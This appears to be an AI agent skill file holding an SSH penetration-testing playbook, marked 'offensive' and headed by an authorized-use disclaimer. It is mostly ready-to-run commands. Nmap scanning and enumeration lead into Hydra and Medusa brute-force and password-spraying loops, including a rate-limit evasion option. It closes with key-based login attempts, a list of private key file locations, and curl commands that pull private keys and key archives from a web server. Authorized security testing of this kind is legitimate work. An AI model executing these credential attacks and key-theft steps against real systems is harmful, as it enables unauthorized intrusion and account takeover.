---
name: ag-ssh-penetration-testing
description: Conduct comprehensive SSH security assessments including enumeration,
  credential attacks, vulnerability exploitation, tunneling techniques, and post-e
version: 1.0.0
tags:
- antigravity
- security
category: software-development
source: https://github.com/sickn33/antigravity-awesome-skills
min_hermes_version: 0.13.0
---

---
name: ssh-penetration-testing
description: "Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security."
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
metadata:
  hermes:
    molin_owner: 墨盾（安全/QA）
---

> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.

# SSH Penetration Testing

## Purpose

Conduct comprehensive SSH security assessments including enumeration, credential attacks, vulnerability exploitation, tunneling techniques, and post-exploitation activities. This skill covers the complete methodology for testing SSH service security.

## Prerequisites

### Required Tools
- Nmap with SSH scripts
- Hydra or Medusa for brute-forcing
- ssh-audit for configuration analysis
- Metasploit Framework
- Python with Paramiko library

### Required Knowledge
- SSH protocol fundamentals
- Public/private key authentication
- Port forwarding concepts
- Linux command-line proficiency

## Outputs and Deliverables

1. **SSH Enumeration Report** - Versions, algorithms, configurations
2. **Credential Assessment** - Weak passwords, default credentials
3. **Vulnerability Assessment** - Known CVEs, misconfigurations
4. **Tunnel Documentation** - Port forwarding configurations

## Core Workflow

### Phase 1: SSH Service Discovery

Identify SSH services on target networks:

```bash
# Quick SSH port scan
nmap -p 22 192.168.1.0/24 --open

# Common alternate SSH ports
nmap -p 22,2222,22222,2200 192.168.1.100

# Full port scan for SSH
nmap -p- --open 192.168.1.100 | grep -i ssh

# Service version detection
nmap -sV -p 22 192.168.1.100
```

### Phase 2: SSH Enumeration

Gather detailed information about SSH services:

```bash
# Banner grabbing
nc 192.168.1.100 22
# Output: SSH-2.0-OpenSSH_8.4p1 Debian-5

# Telnet banner grab
telnet 192.168.1.100 22

# Nmap version detection with scripts
nmap -sV -p 22 --script ssh-hostkey 192.168.1.100

# Enumerate supported algorithms
nmap -p 22 --script ssh2-enum-algos 192.168.1.100

# Get host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100

# Check authentication methods
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.100
```

### Phase 3: SSH Configuration Auditing

Identify weak configurations:

```bash
# ssh-audit - comprehensive SSH audit
ssh-audit 192.168.1.100

# ssh-audit with specific port
ssh-audit -p 2222 192.168.1.100

# Output includes:
# - Algorithm recommendations
# - Security vulnerabilities
# - Hardening suggestions
```

Key configuration weaknesses to identify:
- Weak key exchange algorithms (diffie-hellman-group1-sha1)
- Weak ciphers (arcfour, 3des-cbc)
- Weak MACs (hmac-md5, hmac-sha1-96)
- Deprecated protocol versions

### Phase 4: Credential Attacks

#### Brute-Force with Hydra

```bash
# Single username, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Username list, single password
hydra -L users.txt -p Password123 ssh://192.168.1.100

# Username and password lists
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# With specific port
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.100

# Rate limiting evasion (slow)
hydra -l admin -P passwords.txt -t 1 -w 5 ssh://192.168.1.100

# Verbose output
hydra -l admin -P passwords.txt -vV ssh://192.168.1.100

# Exit on first success
hydra -l admin -P passwords.txt -f ssh://192.168.1.100
```

#### Brute-Force with Medusa

```bash
# Basic brute-force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple targets
medusa -H targets.txt -u admin -P passwords.txt -M ssh

# With username list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# Specific port
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

#### Password Spraying

```bash
# Test common password across users
hydra -L users.txt -p Summer2024! ssh://192.168.1.100

# Multiple common passwords
for pass in "Password123" "Welcome1" "Summer2024!"; do
    hydra -L users.txt -p "$pass" ssh://192.168.1.100
done
```

### Phase 5: Key-Based Authentication Testing

Test for weak or exposed keys:

```bash
# Attempt login with found private key
ssh -i id_rsa user@192.168.1.100

# Specify key explicitly (bypass agent)
ssh -o IdentitiesOnly=yes -i id_rsa user@192.168.1.100

# Force password authentication
ssh -o PreferredAuthentications=password user@192.168.1.100

# Try common key names
for key in id_rsa id_dsa id_ecdsa id_ed25519; do
    ssh -i "$key" user@192.168.1.100
done
```

Check for exposed keys:

```bash
# Common locations for private keys
~/.ssh/id_rsa
~/.ssh/id_dsa
~/.ssh/id_ecdsa
~/.ssh/id_ed25519
/etc/ssh/ssh_host_*_key
/root/.ssh/
/home/*/.ssh/

# Web-accessible keys (check with curl/wget)
curl -s http://target.com/.ssh/id_rsa
curl -s http://target.com/id_rsa
curl -s http://target.com/backup/ssh_keys.tar.gz
```